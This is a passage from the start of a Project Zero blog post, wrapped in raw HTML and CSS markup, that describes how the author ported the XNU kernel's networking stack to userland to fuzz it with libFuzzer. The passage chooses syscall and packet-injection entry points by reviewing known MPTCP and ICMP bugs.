"}.lst-kix_xdx87v22dufh-0&gt;li:before{content:"\0025cf  "}ul.lst-kix_xdx87v22dufh-0{list-style-type:none}.lst-kix_785jj4szr34a-0&gt;li:before{content:"\0025cf  "}.lst-kix_785jj4szr34a-1&gt;li:before{content:"\0025cb  "}ul.lst-kix_xdx87v22dufh-1{list-style-type:none}.lst-kix_n5z70wgxvefs-3&gt;li:before{content:"" counter(lst-ctn-kix_n5z70wgxvefs-3,decimal) ". "}.lst-kix_n5z70wgxvefs-5&gt;li:before{content:"" counter(lst-ctn-kix_n5z70wgxvefs-5,lower-roman) ". "}ul.lst-kix_xdx87v22dufh-2{list-style-type:none}.lst-kix_xdx87v22dufh-2&gt;li:before{content:"\0025a0  "}.lst-kix_785jj4szr34a-3&gt;li:before{content:"\0025cf  "}.lst-kix_xdx87v22dufh-3&gt;li:before{content:"\0025cf  "}.lst-kix_n5z70wgxvefs-4&gt;li:before{content:"" counter(lst-ctn-kix_n5z70wgxvefs-4,lower-latin) ". "}.lst-kix_n5z70wgxvefs-8&gt;li:before{content:"" counter(lst-ctn-kix_n5z70wgxvefs-8,lower-roman) ". "}.lst-kix_xdx87v22dufh-4&gt;li:before{content:"\0025cb  "}.lst-kix_n5z70wgxvefs-1&gt;li:before{content:"" counter(lst-ctn-kix_n5z70wgxvefs-1,lower-latin) ". "}.lst-kix_785jj4szr34a-2&gt;li:before{content:"\0025a0  "}.lst-kix_xdx87v22dufh-5&gt;li:before{content:"\0025a0  "}.lst-kix_n5z70wgxvefs-2&gt;li:before{content:"" counter(lst-ctn-kix_n5z70wgxvefs-2,lower-roman) ". "}ul.lst-kix_3hjmgaf66qdz-7{list-style-type:none}ul.lst-kix_cp3k7292uvts-6{list-style-type:none}ul.lst-kix_3hjmgaf66qdz-6{list-style-type:none}ul.lst-kix_cp3k7292uvts-7{list-style-type:none}.lst-kix_785jj4szr34a-8&gt;li:before{content:"\0025a0  "}ul.lst-kix_cp3k7292uvts-4{list-style-type:none}ul.lst-kix_3hjmgaf66qdz-8{list-style-type:none}ul.lst-kix_cp3k7292uvts-5{list-style-type:none}ul.lst-kix_cp3k7292uvts-2{list-style-type:none}.lst-kix_qvcewxmuzrg7-0&gt;li:before{content:"\0025cf  "}ul.lst-kix_cp3k7292uvts-3{list-style-type:none}.lst-kix_785jj4szr34a-7&gt;li:before{content:"\0025cb  "}ul.lst-kix_cp3k7292uvts-0{list-style-type:none}ul.lst-kix_cp3k7292uvts-1{list-style-type:none}.lst-kix_785jj4szr34a-4&gt;li:before{content:"\0025cb  "}.lst-kix_785jj4szr34a-5&gt;li:before{content:"\0025a0  "}ul.lst-kix_3hjmgaf66qdz-1{list-style-type:none}ul.lst-kix_3hjmgaf66qdz-0{list-style-type:none}.lst-kix_n5z70wgxvefs-7&gt;li:before{content:"" counter(lst-ctn-kix_n5z70wgxvefs-7,lower-latin) ". "}ul.lst-kix_3hjmgaf66qdz-3{list-style-type:none}ul.lst-kix_3hjmgaf66qdz-2{list-style-type:none}.lst-kix_785jj4szr34a-6&gt;li:before{content:"\0025cf  "}.lst-kix_5a1fzjqf1cfs-8&gt;li:before{content:"\0025a0  "}ul.lst-kix_3hjmgaf66qdz-5{list-style-type:none}.lst-kix_xdx87v22dufh-1&gt;li:before{content:"\0025cb  "}ul.lst-kix_3hjmgaf66qdz-4{list-style-type:none}.lst-kix_n5z70wgxvefs-6&gt;li:before{content:"" counter(lst-ctn-kix_n5z70wgxvefs-6,decimal) ". "}.lst-kix_5a1fzjqf1cfs-7&gt;li:before{content:"\0025cb  "}.lst-kix_5a1fzjqf1cfs-6&gt;li:before{content:"\0025cf  "}.lst-kix_hg7n0a8dlgvf-4&gt;li:before{content:"\0025cb  "}.lst-kix_hg7n0a8dlgvf-6&gt;li:before{content:"\0025cf  "}ul.lst-kix_as8tp5tsh1cy-8{list-style-type:none}.lst-kix_hg7n0a8dlgvf-1&gt;li:before{content:"\0025cb  "}.lst-kix_hg7n0a8dlgvf-5&gt;li:before{content:"\0025a0  "}ul.lst-kix_as8tp5tsh1cy-5{list-style-type:none}.lst-kix_5a1fzjqf1cfs-3&gt;li:before{content:"\0025cf  "}ul.lst-kix_as8tp5tsh1cy-4{list-style-type:none}ul.lst-kix_as8tp5tsh1cy-7{list-style-type:none}.lst-kix_5a1fzjqf1cfs-4&gt;li:before{content:"\0025cb  "}.lst-kix_hg7n0a8dlgvf-0&gt;li:before{content:"\0025cf  "}.lst-kix_hg7n0a8dlgvf-8&gt;li:before{content:"\0025a0  "}ul.lst-kix_as8tp5tsh1cy-6{list-style-type:none}ul.lst-kix_as8tp5tsh1cy-1{list-style-type:none}.lst-kix_5a1fzjqf1cfs-5&gt;li:before{content:"\0025a0  "}.lst-kix_5bnah3qvhyc8-7&gt;li:before{content:"\0025cb  "}.lst-kix_5bnah3qvhyc8-8&gt;li:before{content:"\0025a0  "}ul.lst-kix_as8tp5tsh1cy-0{list-style-type:none}ul.lst-kix_as8tp5tsh1cy-3{list-style-type:none}.lst-kix_hg7n0a8dlgvf-7&gt;li:before{content:"\0025cb  "}ul.lst-kix_as8tp5tsh1cy-2{list-style-type:none}.lst-kix_xdx87v22dufh-8&gt;li:before{content:"\0025a0  "}ol.lst-kix_n5z70wgxvefs-4.start{counter-reset:lst-ctn-kix_n5z70wgxvefs-4 0}.lst-kix_5a1fzjqf1cfs-0&gt;li:before{content:"\0025cf  "}.lst-kix_xdx87v22dufh-6&gt;li:before{content:"\0025cf  "}.lst-kix_xdx87v22dufh-7&gt;li:before{content:"\0025cb  "}.lst-kix_n5z70wgxvefs-0&gt;li:before{content:"" counter(lst-ctn-kix_n5z70wgxvefs-0,decimal) ". "}.lst-kix_5a1fzjqf1cfs-2&gt;li:before{content:"\0025a0  "}.lst-kix_hg7n0a8dlgvf-2&gt;li:before{content:"\0025a0  "}.lst-kix_5a1fzjqf1cfs-1&gt;li:before{content:"\0025cb  "}.lst-kix_hg7n0a8dlgvf-3&gt;li:before{content:"\0025cf  "}.lst-kix_cp3k7292uvts-4&gt;li:before{content:"\0025cb  "}.lst-kix_cp3k7292uvts-0&gt;li:before{content:"\0025cf  "}.lst-kix_cp3k7292uvts-8&gt;li:before{content:"\0025a0  "}.lst-kix_as8tp5tsh1cy-8&gt;li:before{content:"\0025a0  "}.lst-kix_cp3k7292uvts-2&gt;li:before{content:"\0025a0  "}.lst-kix_5bnah3qvhyc8-0&gt;li:before{content:"\0025cf  "}.lst-kix_5bnah3qvhyc8-6&gt;li:before{content:"\0025cf  "}.lst-kix_5bnah3qvhyc8-2&gt;li:before{content:"\0025a0  "}.lst-kix_cp3k7292uvts-6&gt;li:before{content:"\0025cf  "}.lst-kix_5bnah3qvhyc8-4&gt;li:before{content:"\0025cb  "}.lst-kix_as8tp5tsh1cy-0&gt;li:before{content:"\0025cf  "}ul.lst-kix_cp3k7292uvts-8{list-style-type:none}.lst-kix_n5z70wgxvefs-8&gt;li{counter-increment:lst-ctn-kix_n5z70wgxvefs-8}ul.lst-kix_pr131atimb8l-4{list-style-type:none}ul.lst-kix_pr131atimb8l-3{list-style-type:none}ul.lst-kix_pr131atimb8l-6{list-style-type:none}ul.lst-kix_pr131atimb8l-5{list-style-type:none}.lst-kix_as8tp5tsh1cy-2&gt;li:before{content:"\0025a0  "}.lst-kix_as8tp5tsh1cy-4&gt;li:before{content:"\0025cb  "}ul.lst-kix_pr131atimb8l-0{list-style-type:none}ul.lst-kix_pr131atimb8l-2{list-style-type:none}ul.lst-kix_pr131atimb8l-1{list-style-type:none}.lst-kix_as8tp5tsh1cy-6&gt;li:before{content:"\0025cf  "}ul.lst-kix_pr131atimb8l-8{list-style-type:none}ul.lst-kix_pr131atimb8l-7{list-style-type:none}ul.lst-kix_5a1fzjqf1cfs-3{list-style-type:none}ul.lst-kix_5a1fzjqf1cfs-2{list-style-type:none}ul.lst-kix_5a1fzjqf1cfs-1{list-style-type:none}ul.lst-kix_5a1fzjqf1cfs-0{list-style-type:none}ul.lst-kix_5a1fzjqf1cfs-8{list-style-type:none}ul.lst-kix_5a1fzjqf1cfs-7{list-style-type:none}ul.lst-kix_5a1fzjqf1cfs-6{list-style-type:none}ol.lst-kix_n5z70wgxvefs-6.start{counter-reset:lst-ctn-kix_n5z70wgxvefs-6 0}ul.lst-kix_5a1fzjqf1cfs-5{list-style-type:none}ul.lst-kix_5a1fzjqf1cfs-4{list-style-type:none}.lst-kix_xh6dzfiz70hf-1&gt;li:before{content:"\0025cb  "}ul.lst-kix_5uzj2xa2gne-1{list-style-type:none}.lst-kix_g9bgj4bu2h0-5&gt;li:before{content:"\0025a0  "}ul.lst-kix_5uzj2xa2gne-0{list-style-type:none}.lst-kix_xh6dzfiz70hf-5&gt;li:before{content:"\0025a0  "}.lst-kix_xh6dzfiz70hf-3&gt;li:before{content:"\0025cf  "}.lst-kix_g9bgj4bu2h0-7&gt;li:before{content:"\0025cb  "}ol.lst-kix_n5z70wgxvefs-7.start{counter-reset:lst-ctn-kix_n5z70wgxvefs-7 0}ul.lst-kix_5uzj2xa2gne-3{list-style-type:none}ul.lst-kix_5uzj2xa2gne-2{list-style-type:none}ul.lst-kix_5uzj2xa2gne-5{list-style-type:none}ul.lst-kix_5uzj2xa2gne-4{list-style-type:none}ul.lst-kix_5uzj2xa2gne-7{list-style-type:none}.lst-kix_xh6dzfiz70hf-7&gt;li:before{content:"\0025cb  "}ul.lst-kix_5uzj2xa2gne-6{list-style-type:none}.lst-kix_3hjmgaf66qdz-1&gt;li:before{content:"\0025cb  "}ul.lst-kix_5uzj2xa2gne-8{list-style-type:none}.lst-kix_n5z70wgxvefs-3&gt;li{counter-increment:lst-ctn-kix_n5z70wgxvefs-3}.lst-kix_3hjmgaf66qdz-3&gt;li:before{content:"\0025cf  "}.lst-kix_3hjmgaf66qdz-7&gt;li:before{content:"\0025cb  "}.lst-kix_3hjmgaf66qdz-5&gt;li:before{content:"\0025a0  "}ol{margin:0;padding:0}table td,table th{padding:0}.c16{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#e0e0e0;border-top-width:1pt;border-right-width:1pt;border-left-color:#e0e0e0;vertical-align:top;border-right-color:#e0e0e0;border-left-width:1pt;border-top-style:solid;background-color:#fafafa;border-left-style:solid;border-bottom-width:1pt;width:468pt;border-top-color:#e0e0e0;border-bottom-style:solid}.c20{padding-top:20pt;padding-bottom:6pt;line-height:1.5;page-break-after:avoid;text-align:left}.c21{color:#595959;font-weight:400;font-size:14pt;font-family:"Arial"}.c13{font-size:10pt;font-family:Consolas,"Courier New";color:#3367d6;font-weight:400}.c11{padding-top:0pt;padding-bottom:16pt;line-height:1.5;text-align:left}.c0{font-size:10pt;font-family:Consolas,"Courier New";color:#000000;font-weight:400}.c6{font-size:10pt;font-family:Consolas,"Courier New";color:#9c27b0;font-weight:400}.c28{padding-top:0pt;padding-bottom:0pt;line-height:1.0;text-align:left}.c26{padding-top:20pt;padding-bottom:16pt;line-height:1.5;text-align:left}.c1{font-size:10pt;font-family:Consolas,"Courier New";color:#616161;font-weight:400}.c3{font-size:10pt;font-family:Consolas,"Courier New";color:#c53929;font-weight:400}.c5{border-spacing:0;border-collapse:collapse;margin-right:auto}.c8{color:#000000;font-weight:400;font-size:11pt;font-family:"Arial"}.c4{padding-top:0pt;padding-bottom:0pt;line-height:1.5;text-align:left}.c14{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline}.c7{color:#000000;font-weight:400;font-size:26pt;font-family:"Arial"}.c19{font-size:10pt;font-family:Consolas,"Courier New";color:#0f9d58;font-weight:400}.c27{color:#000000;font-weight:400;font-size:20pt;font-family:"Arial"}.c30{padding-top:0pt;padding-bottom:16pt;line-height:1.5;text-align:center}.c17{font-size:10pt;font-family:Consolas,"Courier New";color:#455a64;font-weight:400}.c25{padding-top:0pt;padding-bottom:3pt;line-height:1.5;text-align:left}.c31{background-color:#ffffff;max-width:468pt;padding:72pt 72pt 72pt 72pt}.c2{text-decoration:none;vertical-align:baseline;font-style:normal}.c22{-webkit-text-decoration-skip:none;text-decoration:underline;text-decoration-skip-ink:none}.c9{font-family:Consolas,"Courier New";color:#0d904f;font-weight:400}.c24{border:1px solid black;margin:5px}.c18{orphans:2;widows:2}.c12{color:inherit;text-decoration:inherit}.c15{height:11pt}.c10{height:0pt}.c23{page-break-after:avoid}.c29{font-style:italic}.title{padding-top:0pt;color:#000000;font-size:26pt;padding-bottom:3pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:"Arial"}p{margin:0;color:#000000;font-size:11pt;font-family:"Arial"}h1{padding-top:20pt;color:#000000;font-size:20pt;padding-bottom:6pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:18pt;color:#000000;font-size:16pt;padding-bottom:6pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:16pt;color:#434343;font-size:14pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}&lt;/style&gt;&lt;/head&gt;&lt;body class="c31"&gt;&lt;div&gt; &lt;p class="c4 c18 c15"&gt;&lt;span class="c8 c2"&gt;&lt;/span&gt;&lt;/p&gt;&lt;/div&gt; &lt;p class="c11"&gt;&lt;span&gt;Posted by Ned Williams&lt;/span&gt;&lt;span&gt;on&lt;/span&gt;&lt;span class="c8 c2"&gt;, Project Zero&lt;/span&gt;&lt;/p&gt; &lt;p class="c11 c23 title" id="h.ndqbhr40lzdh"&gt;&lt;span class="c7 c2"&gt;Introduction&lt;/span&gt;&lt;/p&gt; &lt;p class="c11"&gt;&lt;span class="c8 c2"&gt;When I started my 20% project &amp;ndash; an initiative where employees are allocated twenty-percent of their paid work time to pursue personal projects &amp;ndash; &amp;nbsp;with Project Zero, I wanted to see if I could apply the techniques I had learned fuzzing Chrome to XNU, the kernel used in iOS and macOS. My interest was sparked after learning some prominent members of the iOS research community believed the kernel was &amp;ldquo;fuzzed to death,&amp;rdquo; and my understanding was that most of the top researchers used auditing for vulnerability research. This meant finding new bugs with fuzzing would be meaningful in demonstrating the value of implementing newer fuzzing techniques. In this project, I pursued a somewhat unusual approach to fuzz XNU networking in userland by converting it into a library, &amp;ldquo;booting&amp;rdquo; it in userspace and using my standard fuzzing workflow to discover vulnerabilities. Somewhat surprisingly, this worked well enough to reproduce some of my peers&amp;rsquo; recent discoveries and report some of my own, one of which was a reliable privilege escalation from the app context, CVE-2019-8605, dubbed &amp;ldquo;SockPuppet.&amp;rdquo; I&amp;rsquo;m excited to open source this fuzzing project, &amp;ldquo;sockfuzzer,&amp;rdquo; for the community to learn from and adapt. In this post, we&amp;rsquo;ll do a deep dive into its design and implementation.&lt;/span&gt;&lt;/p&gt; &lt;p class="c11 c23 title" id="h.hjehdh7g62jx"&gt;&lt;span class="c7 c2"&gt;Attack Surface Review and Target Planning&lt;/span&gt;&lt;/p&gt;&lt;h1 class="c23 c26" id="h.3g484yfwyzbz"&gt;&lt;span class="c27 c2"&gt;Choosing Networking&lt;/span&gt;&lt;/h1&gt; &lt;p class="c11"&gt;&lt;span&gt;We&amp;rsquo;re at the beginning of a multistage&lt;/span&gt;&lt;span&gt;&amp;nbsp;pr&lt;/span&gt;&lt;span&gt;oject. I had enormous respect for the difficulty of the task ahead of me. I knew I would need to be careful investing time at each stage of the process, constantly looking for evidence that I needed to change direction. The first big decision was to decide what exactly we &lt;/span&gt;&lt;span class="c29"&gt;wanted&lt;/span&gt;&lt;span class="c8 c2"&gt;&amp;nbsp;to target.&lt;/span&gt;&lt;/p&gt; &lt;p class="c11"&gt;&lt;span&gt;I started by downloading the &lt;/span&gt;&lt;span class="c14"&gt;&lt;a class="c121" href="https://opensource.apple.com/tarballs/xnu/"&gt;XNU sources&lt;/a&gt;&lt;/span&gt;&lt;span class="c8 c2"&gt;&amp;nbsp;and reviewing them, looking for areas that handled a lot of attacker-controlled input and seemed amenable to fuzzing &amp;ndash; immediately the networking subsystem jumped out as worthy of research. I had just exploited a Chrome sandbox bug that leveraged collaboration between an exploited renderer process and a server working in concert. I recognized these attack surfaces&amp;rsquo; power, where some security-critical code is &amp;ldquo;sandwiched&amp;rdquo; between two attacker-controlled entities. The Chrome browser process is prone to use after free vulnerabilities due to the difficulty of managing state for large APIs, and I suspected XNU would have the same issue. Networking features both parsing and state management. I figured that even if others had already fuzzed the parsers extensively, there could still be use after free vulnerabilities lying dormant.&lt;/span&gt;&lt;/p&gt; &lt;p class="c11"&gt;&lt;span&gt;I then proceeded to look at recent bug reports. Two bugs that caught my eye: the &lt;/span&gt;&lt;span class="c14"&gt;&lt;a class="c121" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1558"&gt;mptcp overflow&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;discovered by Ian Beer and the ICMP &lt;/span&gt;&lt;span class="c14"&gt;&lt;a class="c121" href="https://securitylab.github.com/research/apple-xnu-icmp-error-CVE-2018-4407"&gt;out of bounds write&lt;/a&gt;&lt;/span&gt;&lt;span class="c8 c2"&gt;&amp;nbsp;found by Kevin Backhouse. Both of these are somewhat &amp;ldquo;straightforward&amp;rdquo; buffer overflows. The bugs&amp;rsquo; simplicity hinted that kernel networking, even packet parsing, was sufficiently undertested. A fuzzer combining network syscalls and arbitrary remote packets should be large enough in scope to reproduce these issues and find new ones.&lt;/span&gt;&lt;/p&gt; &lt;p class="c11"&gt;&lt;span class="c8 c2"&gt;Digging deeper, I wanted to understand how to reach these bugs in practice. By cross-referencing the functions and setting kernel breakpoints in a VM, I managed to get a more concrete idea. Here&amp;rsquo;s the call stack for Ian&amp;rsquo;s MPTCP bug:&lt;/span&gt;&lt;/p&gt; &lt;p class="c11"&gt;&lt;/p&gt; &lt;p class="c11"&gt;&lt;span&gt;&lt;a href="https://1.bp.blogspot.com/-HwxE_MXlYoI/YIG6aLGWsaI/AAAAAAAAa20/YcBFKqWUz986Vdarnr8YgdV8NODRM0AKgCNcBGAsYHQ/s0/image3.png" style="display: block; padding: 1em 0;text-align: center;"&gt;&lt;img src="https://1.bp.blogspot.com/-HwxE_MXlYoI/YIG6aLGWsaI/AAAAAAAAa20/YcBFKqWUz986Vdarnr8YgdV8NODRM0AKgCNcBGAsYHQ/s0/image3.png" border="0" alt="" style="max-height: 750; max-width: 600;" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c11"&gt;&lt;span&gt;The buggy function in question is &lt;/span&gt;&lt;span class="c9"&gt;mptcp_usr_connectx&lt;/span&gt;&lt;span&gt;. Moving up the call stack, we find the &lt;/span&gt;&lt;span class="c9"&gt;connectx&lt;/span&gt;&lt;span&gt;&amp;nbsp;syscall, which we see in Ian&amp;rsquo;s original testcase. If we were to write a fuzzer to find this bug, how would we do it? Ultimately, whatever we do has to both find the bug and give us the information we need to reproduce it on the real kernel. Calling &lt;/span&gt;&lt;span class="c9"&gt;mptcp_usr_connectx&lt;/span&gt;&lt;span&gt;&amp;nbsp;directly should surely find the bug, but this seems like the wrong idea because it takes a lot of arguments. Modeling a fuzzer well enough to call this function directly in a way representative of the real code is no easier than auditing the code in the first place, so we&amp;rsquo;ve not made things any easier by writing a targeted fuzzer. It&amp;rsquo;s also wasted effort to write a target for each function this small. On the other hand, the further up the call stack we go, the more complexity we may have to support and the less chance we have of landing on the bug. If I were trying to unit test the networking stack, I would probably avoid the syscall layer and call the intermediate helper functions as a middle ground. This is exactly what I tried in the first draft of the fuzzer; I used &lt;/span&gt;&lt;span class="c14"&gt;&lt;a class="c121" href="https://developer.apple.com/documentation/kernel/1396122-sock_socket"&gt;sock_socket&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;to create &lt;/span&gt;&lt;span class="c9"&gt;struct socket*&lt;/span&gt;&lt;span&gt;&amp;nbsp;objects to pass to &lt;/span&gt;&lt;span class="c9"&gt;connectitx&lt;/span&gt;&lt;span&gt;&amp;nbsp;in the hopes that it would be easy to reproduce this bug while being high-enough level that this bug could plausibly have been discovered without knowing where to look for it&lt;/span&gt;&lt;span&gt;. Surprisingly, after some experimentation, it turned out to be easier to simply call the syscalls directly (via &lt;/span&gt;&lt;span class="c9"&gt;connectx&lt;/span&gt;&lt;span class="c8 c2"&gt;). This makes it easier to translate crashing inputs into programs to run against a real kernel since testcases map 1:1 to syscalls. We&amp;rsquo;ll see more details about this later.&lt;/span&gt;&lt;/p&gt; &lt;p class="c11"&gt;&lt;span&gt;We can&amp;rsquo;t test networking properly without accounting for packets. In this case, data comes from the hardware, not via syscalls from a user process. We&amp;rsquo;ll have to expose this functionality to our fuzzer. To figure out how to extend our framework to support random packet delivery, we can use our next example bug. Let&amp;rsquo;s take a look at the call stack for delivering a packet to trigger the ICMP bug reported by Kevin Backhouse:&lt;/span&gt;&lt;/p&gt; &lt;p class="c30"&gt;&lt;/p&gt; &lt;p class="c11"&gt;&lt;span class="c8 c2"&gt;&lt;a href="https://1.bp.blogspot.com/-f5J0_rzV9sM/YIG6lo2c60I/AAAAAAAAa24/FXHkcY6vxhc0welaK9cDzlvoCwWHNneyACNcBGAsYHQ/s0/image2.png" style="display: block; padding: 1em 0;text-align: center;"&gt;&lt;img src="https://1.bp.blogspot.com/-f5J0_rzV9sM/YIG6lo2c60I/AAAAAAAAa24/FXHkcY6vxhc0welaK9cDzlvoCwWHNneyACNcBGAsYHQ/s0/image2.png" border="0" alt="" style="max-height: 750; max-width: 600;" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c11"&gt;&lt;span&gt;To reach the buggy function, &lt;/span&gt;&lt;span class="c9"&gt;icmp_error&lt;/span&gt;&lt;span&gt;, the call stack is deeper, and unlike with syscalls, it&amp;rsquo;s not immediately obvious which of these functions we should call to cover the relevant code. Starting from the very top of the call stack, we see that the crash occurred in a kernel thread running the &lt;/span&gt;&lt;span class="c9"&gt;dlil_input_thread_func&lt;/span&gt;&lt;span&gt;&amp;nbsp;function. DLIL stands for Data Link Interface Layer, a reference to the OSI model&amp;rsquo;s &lt;/span&gt;&lt;span class="c14"&gt;&lt;a class="c121" href="https://en.wikipedia.org/wiki/Data_link_layer"&gt;data link layer&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. Moving further down the stack, we see &lt;/span&gt;&lt;span class="c9"&gt;ether_inet_input&lt;/span&gt;&lt;span&gt;, indicating an Ethernet packet (since I tested this issue using Ethernet). We finally make it down to the IP layer, where &lt;/span&gt;&lt;span class="c9"&gt;ip_dooptions&lt;/span&gt;&lt;span&gt;&amp;nbsp;signals an &lt;/span&gt;&lt;span class="c9"&gt;icmp_error&lt;/span&gt;&lt;span&gt;. As an attacker, we probably don&amp;rsquo;t have a lot of control over the interface a user uses to receive our input, so we can rule out some of the &lt;/span&gt;&lt;span&gt;uppermost layers&lt;/span&gt;&lt;span&gt;. We also don&amp;rsquo;t want to deal with threads in our fuzzer, another design tradeoff we&amp;rsquo;ll describe in more detail later. &lt;/span&gt;&lt;span class="c9"&gt;proto_input&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class="c9"&gt;ip_proto_input&lt;/span&gt;&lt;span&gt;&amp;nbsp;don&amp;rsquo;t do much, so I decided that &lt;/span&gt;&lt;span class="c9"&gt;ip_proto&lt;/span&gt;&lt;span&gt;&amp;nbsp;was where I would inject packets, simply by calling the function when I wanted to deliver a packet. After reviewing &lt;/span&gt;&lt;span class="c9"&gt;proto_register_input&lt;/span&gt;&lt;span&gt;, I discovered another function called &lt;/span&gt;&lt;span class="c9"&gt;ip6_input&lt;/span&gt;&lt;span&gt;, which was the entry point for the IPv6 code. Here&amp;rsquo;s the prototype for &lt;/span&gt;&lt;span class="c9"&gt;ip_input&lt;/span&gt;&lt;span class="c8 c2"&gt;:&lt;/span&gt;&lt;/p&gt;&lt;a id="t.cf5c301b37182659cde971ba454e9537e2d2f75a"&gt;&lt;/a&gt;&lt;a id="t.0"&gt;&lt;/a&gt;&lt;table class="c5"&gt;&lt;tbody&gt;&lt;tr class="c10"&gt;&lt;td class="c16" colspan="1" rowspan="1"&gt; &lt;p class="c4"&gt;&lt;span class="c6"&gt;void&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;ip_input&lt;/span&gt;&lt;span class="c1"&gt;(&lt;/span&gt;&lt;span class="c6"&gt;struct&lt;/span&gt;&lt;span class="c0"&gt;&amp;nbsp;mbuf &lt;/span&gt;&lt;span class="c1"&gt;*&lt;/span&gt;&lt;span class="c0"&gt;m&lt;/span&gt;&lt;span class="c1"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c11"&gt;&lt;span&gt;&lt;br&gt;Mbufs are message buffers, a standard buffer format used in network stacks. They enable multiple small packets to be chained together through a linked list. So we just need to generate mbufs with random data before calling &lt;/span&gt;&lt;span class="c9"&gt;ip_input&lt;/span&gt;&lt;span class="c8 c2"&gt;.&lt;/span&gt;&lt;/p&gt; &lt;p class="c11"&gt;&lt;span class="c8 c2"&gt;I was surprised by how easy it was to work with the network stack compared to the syscall interface. `ip_input` and `ip6_input` pure functions that don&amp;rsquo;t require us to know any state to call them. But stepping back, it made more sense. Packet delivery is inherently a clean interface: our kernel has no idea what arbitrary packets may be coming in, so the interface takes a raw packet and then further down in the stack decides how to handle it. Many packets contain metadata that affect the kernel state once received. For example, TCP or UDP packets will be matched to an existing connection by their port number.&lt;/span&gt;&lt;/p&gt; &lt;p class="c11"&gt;&lt;span&gt;Most modern coverage guided fuzzers, including this LibFuzzer-based project, use a design inspired by AFL. When a test case with some known coverage is mutated and the mutant produces coverage that hasn&amp;rsquo;t been seen before, the mutant is added to the current corpus of inputs. It becomes available for further mutations to produce even deeper coverage. Lcamtuf, the author of AFL, has an excellent demonstration of how this algorithm &lt;/span&gt;&lt;span class="c14"&gt;&lt;a class="c121" href="https://lcamtuf.blogspot.com/2014/11/pulling-jpegs-out-of-thin-air.html"&gt;created JPEGs using coverage feedback&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;with no well-formed starting samples. In essence, most poorly-formed inputs are rejected early. When a mutated input passes a validation check, the input is saved. Then that input can be mutated until it manages to pass the second validation check, and so on. This &lt;/span&gt;&lt;span&gt;hill climbing algorithm&lt;/span&gt;&lt;span&gt;&amp;nbsp;has no problem generating dependent sequences of API calls, in this case to interleave syscalls with &lt;/span&gt;&lt;span class="c9"&gt;ip_input&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class="c9"&gt;ip6_input&lt;/span&gt;&lt;span&gt;. Random syscalls can get the kernel into some state where it&amp;rsquo;s expecting a packet. Later, when libFuzzer guesses a packet that gets the kernel into some new state, the hill climbing algorithm will record a new test case when it sees new coverage. Dependent sequences of syscalls and packets are brute-forced in a linear fashion, one call at a time.&lt;/span&gt;&lt;/p&gt; &lt;p class="c11 c23 title" id="h.eby3d6n6dnx2"&gt;&lt;span class="c7 c2"&gt;Designing for (Development) Speed&lt;/span&gt;&lt;/p&gt; &lt;p class="c11"&gt;&lt;span class="c8 c2"&gt;Now that we know where to attack this code base, it&amp;rsquo;s a matter of building out the fuzzing research platform. I like thinking of it this way because it emphasizes that this fuzzer is a powerful assistant to a researcher, but it can&amp;rsquo;t do all the work. Like any other test framework, it empowers the researcher to make hypotheses and run experiments over code that looks buggy. For the platform to be helpful, it needs to be comfortable and fun to work with and get out of the way.&lt;/span&gt;&lt;/p&gt; &lt;p class="c11"&gt;&lt;span class="c8 c2"&gt;When it comes to standard practice for kernel fuzzing, there&amp;rsquo;s a pretty simple spectrum for strategies. On one end, you fuzz self-contained functions that are security-critical, e.g., OSUnserializeBinary. These are easy to write and manage and are generally quite performant. On the other end, you have &amp;ldquo;end to end&amp;rdquo; kernel testing that performs random syscalls against a real kernel instance. These heavyweight fuzzers have the advantage of producing issues that you know are actionable right away, but setup and iterative development are slower. I wanted to try a hybrid approach that could preserve some of the benefits of each style. To do so, I would port the networking stack of XNU out of the kernel and into userland while preserving as much of the original code as possible. Kernel code can be surprisingly portable and amenable to unit testing, even when run outside its natural environment.&lt;/span&gt;&lt;/p&gt; &lt;p class="c11"&gt;&lt;span&gt;There has been a push to add more user-mode unit testing to Linux. If you look at the documentation for Linux&amp;rsquo;s &lt;/span&gt;&lt;span class="c14"&gt;&lt;a class="c121" href="https://www.kernel.org/doc/html/latest/dev-tools/kunit/index.html"&gt;KUnit project&lt;/a&gt;&lt;/span&gt;&lt;span class="c8 c2"&gt;, there&amp;rsquo;s an excellent quote from Linus Torvalds: &amp;ldquo;&amp;hellip; a lot of people seem to think that performance is about doing the same thing, just doing it faster, and that is not true. That is not what performance is all about. If you can do something really fast, really well, people will start using it differently.&amp;rdquo; This statement echoes the experience I had writing targeted fuzzers for code in Chrome&amp;rsquo;s browser process. Due to extensive unit testing, Chrome code is already well-factored for fuzzing. In a 